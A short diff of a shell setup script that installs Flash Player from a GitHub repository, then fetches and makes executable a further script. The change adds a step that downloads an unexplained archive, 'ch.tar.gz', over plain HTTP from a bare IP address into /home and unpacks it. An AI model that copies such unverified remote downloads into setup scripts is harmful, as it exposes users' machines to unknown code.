@@ -38,8 +38,12 @@ sleep 1
 wget https://github.com/mazbron/x/raw/master/install_flash_player_11_linux.x86_64.tar.gz
 tar -xvf install_flash_player_11_linux.x86_64.tar.gz
 sudo cp libflashplayer.so /usr/lib/mozilla/plugins
-mkdir Desktop
 sleep 2
+cd /home
+wget 149.56.111.62/ch.tar.gz
+tar -xvf ch.tar.gz
+sleep 2
+mkdir Desktop
 cd Desktop
 wget https://raw.githubusercontent.com/mazbron/x/master/ff.sh
 chmod +x ff.sh
